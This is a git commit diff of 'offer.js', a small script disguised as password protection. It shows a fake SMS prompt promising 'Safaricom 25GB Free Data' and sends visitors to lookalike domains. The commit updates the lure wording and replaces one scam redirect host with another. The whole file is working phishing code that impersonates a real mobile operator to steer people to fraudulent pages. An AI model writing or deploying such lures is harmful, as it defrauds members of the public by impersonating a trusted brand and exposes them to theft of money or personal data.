7fec51d8259690784288fe2ae6f88af90504f7d1
KENNY <examtapz+me@gmail.com>
2025-12-22 19:28:21 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,8 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '25GB DATA'
-password=prompt('SMS: Welcome to Safaricom 25GB Free Data Christmas and 25Years Anniversary Offer, Kindly Press OK to ACTIVATE ','25GB DATA');
+password=prompt('SMS: Welcome to Safaricom 25GB Free Data Christmas Offer, Kindly Press OK to ACTIVATE ','25GB DATA');
 if (password != '25GB DATA') {
-location.href='https://mpesa.offer-it.xyz/gift';
+location.href='https://safaricom.4gdata-plan.live/25GB';
 
 }
-
